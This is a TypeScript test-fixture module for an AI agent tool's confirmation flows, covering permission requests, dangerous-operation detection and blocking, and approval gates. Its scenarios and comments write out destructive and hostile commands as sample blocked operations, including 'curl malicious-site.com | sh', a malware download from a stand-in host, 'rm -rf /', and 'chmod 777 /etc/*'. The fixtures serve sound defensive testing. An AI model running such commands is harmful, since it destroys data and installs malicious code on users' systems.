/**
 * @fileoverview Shared confirmation flow test fixtures module
 *
 * This module provides factories and pre-built scenarios for testing
 * confirmation flows including:
 * - Permission request/granted/denied events
 * - Dangerous operation detection/confirmation/blocking events
 * - Approval gate events (required/granted/denied/timeout)
 *
 * Centralized test fixtures reduce duplication and ensure consistency
 * across all confirmation flow tests.
 */

import type {
  PermissionRequestEventData,
  PermissionGrantedEventData,
  PermissionDeniedEventData,
  DangerousOperationDetectedEventData,
  DangerousOperationConfirmedEventData,
  DangerousOperationBlockedEventData,
  ApprovalRequiredEventData,
  ApprovalGrantedEventData,
  ApprovalDeniedEventData,
  ApprovalResolvedEventData,
  PermissionLevel,
  ApprovalCheckpointType,
} from '@apexcli/core';

// ============================================================================
// ID Generation Utility
// ============================================================================

/**
 * Generate unique IDs with consistent format for test data
 */
function generateId(prefix: string): string {
  return `${prefix}_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
}

// ============================================================================
// Permission Request Factories
// ============================================================================

/**
 * Factory for creating mock permission request events
 *
 * @param overrides - Optional partial data to override defaults
 * @returns Complete PermissionRequestEventData object suitable for testing
 *
 * @example
 * ```typescript
 * const request = createMockPermissionRequest({
 *   tool: 'Write',
 *   scope: '/project/src/test.ts',
 *   description: 'Agent wants to write test file'
 * });
 * ```
 */
export function createMockPermissionRequest(
  overrides?: Partial<PermissionRequestEventData>
): PermissionRequestEventData {
  return {
    requestId: generateId('req'),
    tool: 'Read',
    scope: undefined,
    description: 'Mock permission request for testing',
    isDangerous: false,
    agent: 'test-agent',
    timestamp: new Date(),
    metadata: {},
    ...overrides,
  };
}

/**
 * Factory for creating mock permission granted events
 *
 * @param overrides - Optional partial data to override defaults
 * @returns Complete PermissionGrantedEventData object suitable for testing
 *
 * @example
 * ```typescript
 * const granted = createMockPermissionGranted({
 *   tool: 'Bash',
 *   level: 'allow-once',
 *   grantedBy: 'user@example.com'
 * });
 * ```
 */
export function createMockPermissionGranted(
  overrides?: Partial<PermissionGrantedEventData>
): PermissionGrantedEventData {
  const request = createMockPermissionRequest(overrides);
  return {
    requestId: request.requestId,
    tool: request.tool,
    scope: request.scope,
    level: 'allow-always' as PermissionLevel,
    grantedBy: 'test-user',
    timestamp: new Date(),
    reason: 'Mock grant for testing',
    ...overrides,
  };
}

/**
 * Factory for creating mock permission denied events
 *
 * @param overrides - Optional partial data to override defaults
 * @returns Complete PermissionDeniedEventData object suitable for testing
 *
 * @example
 * ```typescript
 * const denied = createMockPermissionDenied({
 *   tool: 'Bash',
 *   reason: 'Command contains dangerous operations',
 *   deniedBy: 'security-policy'
 * });
 * ```
 */
export function createMockPermissionDenied(
  overrides?: Partial<PermissionDeniedEventData>
): PermissionDeniedEventData {
  const request = createMockPermissionRequest(overrides);
  return {
    requestId: request.requestId,
    tool: request.tool,
    scope: request.scope,
    deniedBy: 'test-system',
    timestamp: new Date(),
    reason: 'Mock denial for testing',
    ...overrides,
  };
}

// ============================================================================
// Dangerous Operation Factories
// ============================================================================

/**
 * Factory for creating mock dangerous operation detection events
 *
 * @param overrides - Optional partial data to override defaults
 * @returns Complete DangerousOperationDetectedEventData object suitable for testing
 *
 * @example
 * ```typescript
 * const dangerous = createMockDangerousOperationDetected({
 *   operation: 'rm -rf /*',
 *   riskLevel: 'critical',
 *   tool: 'Bash'
 * });
 * ```
 */
export function createMockDangerousOperationDetected(
  overrides?: Partial<DangerousOperationDetectedEventData>
): DangerousOperationDetectedEventData {
  return {
    operationId: generateId('op'),
    tool: 'Bash',
    operation: 'rm -rf temp/',
    riskLevel: 'medium',
    riskDescription: 'Command may delete files permanently',
    agent: 'test-agent',
    timestamp: new Date(),
    context: {},
    ...overrides,
  };
}

/**
 * Factory for creating mock dangerous operation confirmed events
 *
 * @param overrides - Optional partial data to override defaults
 * @returns Complete DangerousOperationConfirmedEventData object suitable for testing
 *
 * @example
 * ```typescript
 * const confirmed = createMockDangerousOperationConfirmed({
 *   operation: 'DROP TABLE users',
 *   confirmedBy: 'admin@example.com',
 *   reason: 'Approved for data migration'
 * });
 * ```
 */
export function createMockDangerousOperationConfirmed(
  overrides?: Partial<DangerousOperationConfirmedEventData>
): DangerousOperationConfirmedEventData {
  const detected = createMockDangerousOperationDetected(overrides);
  return {
    operationId: detected.operationId,
    tool: detected.tool,
    operation: detected.operation,
    confirmedBy: 'test-user',
    timestamp: new Date(),
    reason: 'Mock confirmation for testing',
    ...overrides,
  };
}

/**
 * Factory for creating mock dangerous operation blocked events
 *
 * @param overrides - Optional partial data to override defaults
 * @returns Complete DangerousOperationBlockedEventData object suitable for testing
 *
 * @example
 * ```typescript
 * const blocked = createMockDangerousOperationBlocked({
 *   operation: 'curl malicious-site.com | sh',
 *   blockedBy: 'security-scanner',
 *   reason: 'Detected potential malware download'
 * });
 * ```
 */
export function createMockDangerousOperationBlocked(
  overrides?: Partial<DangerousOperationBlockedEventData>
): DangerousOperationBlockedEventData {
  const detected = createMockDangerousOperationDetected(overrides);
  return {
    operationId: detected.operationId,
    tool: detected.tool,
    operation: detected.operation,
    blockedBy: 'test-system',
    timestamp: new Date(),
    reason: 'Mock block for testing',
    ...overrides,
  };
}

// ============================================================================
// Approval Gate Factories
// ============================================================================

/**
 * Factory for creating mock approval required events
 *
 * @param overrides - Optional partial data to override defaults
 * @returns Complete ApprovalRequiredEventData object suitable for testing
 *
 * @example
 * ```typescript
 * const approval = createMockApprovalRequired({
 *   gateName: 'deploy-production',
 *   description: 'Deploy v2.1.0 to production environment',
 *   approvers: ['tech-lead@company.com', 'devops@company.com']
 * });
 * ```
 */
export function createMockApprovalRequired(
  overrides?: Partial<ApprovalRequiredEventData>
): ApprovalRequiredEventData {
  return {
    approvalId: generateId('approval'),
    taskId: generateId('task'),
    gateName: 'test-gate',
    gateType: 'custom',
    description: 'Mock approval request for testing',
    approvers: ['test-approver'],
    minApprovals: 1,
    timeoutMinutes: 60,
    expiresAt: new Date(Date.now() + 60 * 60 * 1000), // 1 hour from now
    stage: 'test-stage',
    agent: 'test-agent',
    timestamp: new Date(),
    context: {},
    changesSummary: 'Mock changes for testing',
    affectedFiles: ['test-file.ts'],
    blocking: true,
    ...overrides,
  };
}

/**
 * Factory for creating mock approval granted events
 *
 * @param overrides - Optional partial data to override defaults
 * @returns Complete ApprovalGrantedEventData object suitable for testing
 *
 * @example
 * ```typescript
 * const granted = createMockApprovalGranted({
 *   approver: 'tech-lead@company.com',
 *   comment: 'LGTM - approved for deployment'
 * });
 * ```
 */
export function createMockApprovalGranted(
  overrides?: Partial<ApprovalGrantedEventData>
): ApprovalGrantedEventData {
  const request = createMockApprovalRequired(overrides);
  return {
    approvalId: request.approvalId,
    taskId: request.taskId,
    approver: 'test-approver',
    comment: 'Mock approval for testing',
    timestamp: new Date(),
    ...overrides,
  };
}

/**
 * Factory for creating mock approval denied events
 *
 * @param overrides - Optional partial data to override defaults
 * @returns Complete ApprovalDeniedEventData object suitable for testing
 *
 * @example
 * ```typescript
 * const denied = createMockApprovalDenied({
 *   approver: 'security-team@company.com',
 *   reason: 'Security review failed - missing vulnerability scans'
 * });
 * ```
 */
export function createMockApprovalDenied(
  overrides?: Partial<ApprovalDeniedEventData>
): ApprovalDeniedEventData {
  const request = createMockApprovalRequired(overrides);
  return {
    approvalId: request.approvalId,
    taskId: request.taskId,
    approver: 'test-approver',
    reason: 'Mock denial for testing',
    timestamp: new Date(),
    ...overrides,
  };
}

/**
 * Factory for creating mock approval resolved events
 *
 * @param overrides - Optional partial data to override defaults
 * @returns Complete ApprovalResolvedEventData object suitable for testing
 *
 * @example
 * ```typescript
 * const resolved = createMockApprovalResolved({
 *   resolution: 'timeout',
 *   comment: 'No response received within timeout period'
 * });
 * ```
 */
export function createMockApprovalResolved(
  overrides?: Partial<ApprovalResolvedEventData>
): ApprovalResolvedEventData {
  const request = createMockApprovalRequired(overrides);
  const requestedAt = request.timestamp;
  const resolvedAt = new Date();

  return {
    approvalId: request.approvalId,
    taskId: request.taskId,
    gateName: request.gateName,
    resolution: 'approved',
    resolvedBy: 'test-system',
    comment: 'Mock resolution for testing',
    timestamp: resolvedAt,
    requestedAt,
    totalDurationMs: resolvedAt.getTime() - requestedAt.getTime(),
    approvalsReceived: 1,
    approvalsRequired: 1,
    ...overrides,
  };
}

// ============================================================================
// Standard Test Scenarios
// ============================================================================

/**
 * Generic confirmation scenario interface for organizing test cases
 */
export interface ConfirmationScenario<TRequest, TResponse> {
  name: string;
  description: string;
  request: TRequest;
  response: TResponse;
  expectedOutcome: 'approved' | 'denied' | 'timeout' | 'blocked';
}

/**
 * Pre-built permission flow scenarios for common test cases
 */
export const PERMISSION_SCENARIOS = {
  approved: [
    {
      name: 'File read permission granted always',
      description: 'User grants permanent read permission for file access',
      request: createMockPermissionRequest({
        tool: 'Read',
        scope: '/project/src/config.json',
        description: 'Agent needs to read configuration file',
      }),
      response: createMockPermissionGranted({
        tool: 'Read',
        level: 'allow-always',
        reason: 'Safe read operation approved'
      }),
      expectedOutcome: 'approved' as const,
    },
    {
      name: 'Script execution permission granted once',
      description: 'User grants one-time execution permission for npm install',
      request: createMockPermissionRequest({
        tool: 'Bash',
        scope: 'npm install',
        description: 'Agent wants to install project dependencies',
        isDangerous: false,
      }),
      response: createMockPermissionGranted({
        tool: 'Bash',
        level: 'allow-once',
        reason: 'Safe npm command approved for single use'
      }),
      expectedOutcome: 'approved' as const,
    }
  ] as ConfirmationScenario<PermissionRequestEventData, PermissionGrantedEventData>[],

  denied: [
    {
      name: 'Network access denied by policy',
      description: 'System denies network access due to security policy',
      request: createMockPermissionRequest({
        tool: 'WebFetch',
        scope: 'https://malicious-site.com/data.json',
        description: 'Agent wants to fetch data from external API',
        isDangerous: true,
      }),
      response: createMockPermissionDenied({
        tool: 'WebFetch',
        deniedBy: 'security-policy',
        reason: 'Domain blocked by security policy'
      }),
      expectedOutcome: 'denied' as const,
    },
    {
      name: 'File write denied insufficient privileges',
      description: 'User denies write access to protected system directory',
      request: createMockPermissionRequest({
        tool: 'Write',
        scope: '/etc/passwd',
        description: 'Agent wants to modify system user file',
        isDangerous: true,
      }),
      response: createMockPermissionDenied({
        tool: 'Write',
        deniedBy: 'user',
        reason: 'Cannot modify protected system files'
      }),
      expectedOutcome: 'denied' as const,
    }
  ] as ConfirmationScenario<PermissionRequestEventData, PermissionDeniedEventData>[],
};

/**
 * Pre-built dangerous operation scenarios for common test cases
 */
export const DANGEROUS_OPERATION_SCENARIOS = {
  confirmed: [
    {
      name: 'Database cleanup confirmed by DBA',
      description: 'Database administrator confirms cleanup of test data',
      request: createMockDangerousOperationDetected({
        tool: 'Bash',
        operation: 'DROP TABLE test_data',
        riskLevel: 'high',
        riskDescription: 'Will permanently delete all test data',
        agent: 'db-agent',
      }),
      response: createMockDangerousOperationConfirmed({
        tool: 'Bash',
        operation: 'DROP TABLE test_data',
        confirmedBy: 'dba@company.com',
        reason: 'Approved for test environment cleanup'
      }),
      expectedOutcome: 'approved' as const,
    },
    {
      name: 'File deletion confirmed by user',
      description: 'User confirms deletion of temporary files',
      request: createMockDangerousOperationDetected({
        tool: 'Bash',
        operation: 'rm -rf /tmp/build_*',
        riskLevel: 'medium',
        riskDescription: 'Will delete all temporary build files',
        agent: 'cleanup-agent',
      }),
      response: createMockDangerousOperationConfirmed({
        tool: 'Bash',
        operation: 'rm -rf /tmp/build_*',
        confirmedBy: 'user',
        reason: 'Safe to remove temporary files'
      }),
      expectedOutcome: 'approved' as const,
    }
  ] as ConfirmationScenario<DangerousOperationDetectedEventData, DangerousOperationConfirmedEventData>[],

  blocked: [
    {
      name: 'Critical system file deletion blocked',
      description: 'System blocks attempt to delete critical system files',
      request: createMockDangerousOperationDetected({
        tool: 'Bash',
        operation: 'rm -rf /',
        riskLevel: 'critical',
        riskDescription: 'Would destroy entire filesystem',
        agent: 'rogue-agent',
      }),
      response: createMockDangerousOperationBlocked({
        tool: 'Bash',
        operation: 'rm -rf /',
        blockedBy: 'system-protection',
        reason: 'Operation would destroy filesystem - automatically blocked'
      }),
      expectedOutcome: 'blocked' as const,
    },
    {
      name: 'Malware download blocked by security scanner',
      description: 'Security system blocks attempt to download malware',
      request: createMockDangerousOperationDetected({
        tool: 'WebFetch',
        operation: 'curl http://malware.site/trojan.exe',
        riskLevel: 'critical',
        riskDescription: 'Attempting to download known malware',
        agent: 'compromised-agent',
      }),
      response: createMockDangerousOperationBlocked({
        tool: 'WebFetch',
        operation: 'curl http://malware.site/trojan.exe',
        blockedBy: 'security-scanner',
        reason: 'Known malware URL detected'
      }),
      expectedOutcome: 'blocked' as const,
    }
  ] as ConfirmationScenario<DangerousOperationDetectedEventData, DangerousOperationBlockedEventData>[],
};

/**
 * Pre-built approval gate scenarios for common test cases
 */
export const APPROVAL_SCENARIOS = {
  approved: [
    {
      name: 'Production deployment approved by tech lead',
      description: 'Tech lead approves production deployment after code review',
      request: createMockApprovalRequired({
        gateName: 'deploy-production',
        gateType: 'before-deploy',
        description: 'Deploy v2.1.0 to production environment',
        approvers: ['tech-lead@company.com'],
        changesSummary: 'Bug fixes and performance improvements',
        affectedFiles: ['src/api/server.ts', 'src/utils/cache.ts'],
      }),
      response: createMockApprovalGranted({
        approver: 'tech-lead@company.com',
        comment: 'Code review passed, approved for deployment'
      }),
      expectedOutcome: 'approved' as const,
    },
    {
      name: 'Security review approved by security team',
      description: 'Security team approves changes after vulnerability assessment',
      request: createMockApprovalRequired({
        gateName: 'security-review',
        gateType: 'custom',
        description: 'Security review for authentication changes',
        approvers: ['security@company.com'],
        changesSummary: 'Updated authentication middleware',
        affectedFiles: ['src/auth/middleware.ts'],
      }),
      response: createMockApprovalGranted({
        approver: 'security@company.com',
        comment: 'Security assessment passed'
      }),
      expectedOutcome: 'approved' as const,
    }
  ] as ConfirmationScenario<ApprovalRequiredEventData, ApprovalGrantedEventData>[],

  denied: [
    {
      name: 'Production deployment denied due to failing tests',
      description: 'Deployment blocked due to test failures',
      request: createMockApprovalRequired({
        gateName: 'deploy-production',
        gateType: 'custom',
        description: 'Deploy v2.2.0 to production environment',
        approvers: ['qa@company.com'],
        changesSummary: 'New feature implementation',
        affectedFiles: ['src/features/newFeature.ts'],
      }),
      response: createMockApprovalDenied({
        approver: 'qa@company.com',
        reason: 'Critical test failures detected in integration tests'
      }),
      expectedOutcome: 'denied' as const,
    },
    {
      name: 'Security review denied due to vulnerabilities',
      description: 'Security team denies changes due to security concerns',
      request: createMockApprovalRequired({
        gateName: 'security-review',
        gateType: 'custom',
        description: 'Security review for database schema changes',
        approvers: ['security@company.com'],
        changesSummary: 'Added new user roles and permissions',
        affectedFiles: ['src/db/schema.sql', 'src/auth/roles.ts'],
      }),
      response: createMockApprovalDenied({
        approver: 'security@company.com',
        reason: 'Insufficient input validation for new role assignments'
      }),
      expectedOutcome: 'denied' as const,
    }
  ] as ConfirmationScenario<ApprovalRequiredEventData, ApprovalDeniedEventData>[],

  timeout: [
    {
      name: 'Approval timeout with auto-denial',
      description: 'Approval request times out and is automatically denied',
      request: createMockApprovalRequired({
        gateName: 'manual-review',
        gateType: 'custom',
        description: 'Manual review required for configuration changes',
        approvers: ['admin@company.com'],
        timeoutMinutes: 5,
        changesSummary: 'Updated production configuration',
      }),
      response: createMockApprovalResolved({
        resolution: 'timeout',
        resolvedBy: 'timeout-system',
        comment: 'No response received within 5 minutes'
      }),
      expectedOutcome: 'timeout' as const,
    },
    {
      name: 'Extended approval timeout',
      description: 'Long-running approval that eventually times out',
      request: createMockApprovalRequired({
        gateName: 'compliance-review',
        gateType: 'custom',
        description: 'Compliance review for data retention policy changes',
        approvers: ['compliance@company.com'],
        timeoutMinutes: 1440, // 24 hours
        changesSummary: 'Updated data retention from 90 to 180 days',
      }),
      response: createMockApprovalResolved({
        resolution: 'timeout',
        resolvedBy: 'timeout-system',
        comment: 'No response received within 24 hours'
      }),
      expectedOutcome: 'timeout' as const,
    }
  ] as ConfirmationScenario<ApprovalRequiredEventData, ApprovalResolvedEventData>[],
};

// ============================================================================
// Parameterized Generators
// ============================================================================

/**
 * Entry in the permission matrix containing all related events
 */
export interface PermissionMatrixEntry {
  tool: string;
  level: PermissionLevel;
  request: PermissionRequestEventData;
  grantedResponse: PermissionGrantedEventData;
  deniedResponse: PermissionDeniedEventData;
}

/**
 * Generate permission scenarios for all tool/level combinations
 * Useful for comprehensive testing across different tools and permission levels
 *
 * @param tools - List of tools to generate scenarios for (defaults to common tools)
 * @returns Array of permission matrix entries
 *
 * @example
 * ```typescript
 * generatePermissionMatrix(['Read', 'Write', 'Bash']).forEach(entry => {
 *   describe(`${entry.tool} at ${entry.level}`, () => {
 *     it('should grant permission', () => { // test with entry.grantedResponse });
 *     it('should deny permission', () => { // test with entry.deniedResponse });
 *   });
 * });
 * ```
 */
export function generatePermissionMatrix(
  tools: string[] = ['Read', 'Write', 'Edit', 'Bash', 'Grep', 'Glob', 'WebFetch', 'WebSearch', 'TodoWrite']
): PermissionMatrixEntry[] {
  const levels: PermissionLevel[] = ['allow-always', 'allow-once', 'deny'];
  const matrix: PermissionMatrixEntry[] = [];

  for (const tool of tools) {
    for (const level of levels) {
      const request = createMockPermissionRequest({
        tool,
        description: `Agent wants to use ${tool} tool`,
      });

      const grantedResponse = createMockPermissionGranted({
        tool,
        level,
        requestId: request.requestId,
        reason: `Granted ${level} access to ${tool}`,
      });

      const deniedResponse = createMockPermissionDenied({
        tool,
        requestId: request.requestId,
        reason: `Denied access to ${tool} tool`,
      });

      matrix.push({
        tool,
        level,
        request,
        grantedResponse,
        deniedResponse,
      });
    }
  }

  return matrix;
}

/**
 * Risk level scenario containing dangerous operation and possible outcomes
 */
export interface RiskLevelScenario {
  riskLevel: 'low' | 'medium' | 'high' | 'critical';
  operation: DangerousOperationDetectedEventData;
  confirmedResponse: DangerousOperationConfirmedEventData;
  blockedResponse: DangerousOperationBlockedEventData;
}

/**
 * Generate dangerous operation scenarios for each risk level
 * Provides comprehensive coverage of different risk categories
 *
 * @returns Array of risk level scenarios
 *
 * @example
 * ```typescript
 * generateRiskLevelScenarios().forEach(scenario => {
 *   describe(`Risk level: ${scenario.riskLevel}`, () => {
 *     it('should handle confirmation', () => { // test with scenario.confirmedResponse });
 *     it('should handle blocking', () => { // test with scenario.blockedResponse });
 *   });
 * });
 * ```
 */
export function generateRiskLevelScenarios(): RiskLevelScenario[] {
  const riskLevels = [
    {
      level: 'low' as const,
      operation: 'ls -la temp/',
      description: 'Listing directory contents',
      tool: 'Bash',
    },
    {
      level: 'medium' as const,
      operation: 'rm temp/*.log',
      description: 'Deleting temporary log files',
      tool: 'Bash',
    },
    {
      level: 'high' as const,
      operation: 'DROP TABLE user_sessions',
      description: 'Dropping database table',
      tool: 'Bash',
    },
    {
      level: 'critical' as const,
      operation: 'chmod 777 /etc/*',
      description: 'Changing permissions on system files',
      tool: 'Bash',
    },
  ];

  return riskLevels.map(({ level, operation, description, tool }) => {
    const detectedOperation = createMockDangerousOperationDetected({
      tool,
      operation,
      riskLevel: level,
      riskDescription: description,
    });

    const confirmedResponse = createMockDangerousOperationConfirmed({
      operationId: detectedOperation.operationId,
      tool,
      operation,
      reason: `${level} risk operation approved by user`,
    });

    const blockedResponse = createMockDangerousOperationBlocked({
      operationId: detectedOperation.operationId,
      tool,
      operation,
      reason: `${level} risk operation blocked by policy`,
    });

    return {
      riskLevel: level,
      operation: detectedOperation,
      confirmedResponse,
      blockedResponse,
    };
  });
}

/**
 * Timeout scenario with specific configuration and expected resolution
 */
export interface TimeoutScenario {
  name: string;
  timeoutMinutes: number;
  timeoutAction: 'reject' | 'approve' | 'escalate';
  request: ApprovalRequiredEventData;
  expectedResolution: ApprovalResolvedEventData;
}

/**
 * Generate timeout scenarios with various configurations
 * Covers different timeout behaviors and durations
 *
 * @returns Array of timeout scenarios
 *
 * @example
 * ```typescript
 * generateTimeoutScenarios().forEach(scenario => {
 *   it(`should handle ${scenario.name}`, async () => {
 *     // Set up test with scenario.request
 *     await waitForTimeout(scenario.timeoutMinutes);
 *     // Verify scenario.expectedResolution
 *   });
 * });
 * ```
 */
export function generateTimeoutScenarios(): TimeoutScenario[] {
  const scenarios = [
    {
      name: 'Quick timeout rejection',
      timeoutMinutes: 5,
      timeoutAction: 'reject' as const,
      resolution: 'timeout' as const,
      comment: 'Auto-rejected after 5 minute timeout',
    },
    {
      name: 'Standard timeout rejection',
      timeoutMinutes: 60,
      timeoutAction: 'reject' as const,
      resolution: 'timeout' as const,
      comment: 'Auto-rejected after 1 hour timeout',
    },
    {
      name: 'Extended timeout rejection',
      timeoutMinutes: 1440,
      timeoutAction: 'reject' as const,
      resolution: 'timeout' as const,
      comment: 'Auto-rejected after 24 hour timeout',
    },
    {
      name: 'Emergency timeout escalation',
      timeoutMinutes: 30,
      timeoutAction: 'escalate' as const,
      resolution: 'timeout' as const,
      comment: 'Escalated to senior team after 30 minutes',
    },
  ];

  return scenarios.map((config) => {
    const request = createMockApprovalRequired({
      gateName: `timeout-${config.timeoutMinutes}min`,
      timeoutMinutes: config.timeoutMinutes,
      description: `Test approval with ${config.timeoutMinutes} minute timeout`,
    });

    const expectedResolution = createMockApprovalResolved({
      approvalId: request.approvalId,
      taskId: request.taskId,
      gateName: request.gateName,
      resolution: config.resolution,
      comment: config.comment,
      requestedAt: request.timestamp,
    });

    return {
      name: config.name,
      timeoutMinutes: config.timeoutMinutes,
      timeoutAction: config.timeoutAction,
      request,
      expectedResolution,
    };
  });
}

// ============================================================================
// Exports for Backwards Compatibility
// ============================================================================

/**
 * Re-export factories with alternative naming for backwards compatibility
 * and to match existing test patterns in the codebase
 */
export {
  createMockPermissionRequest as createMockPermissionRequestEventData,
  createMockPermissionGranted as createMockPermissionGrantedEventData,
  createMockPermissionDenied as createMockPermissionDeniedEventData,
  createMockDangerousOperationDetected as createMockDangerousOperationDetectedEventData,
  createMockDangerousOperationConfirmed as createMockDangerousOperationConfirmedEventData,
  createMockDangerousOperationBlocked as createMockDangerousOperationBlockedEventData,
  createMockApprovalRequired as createMockApprovalRequiredEventData,
  createMockApprovalGranted as createMockApprovalGrantedEventData,
  createMockApprovalDenied as createMockApprovalDeniedEventData,
  createMockApprovalResolved as createMockApprovalResolvedEventData,
};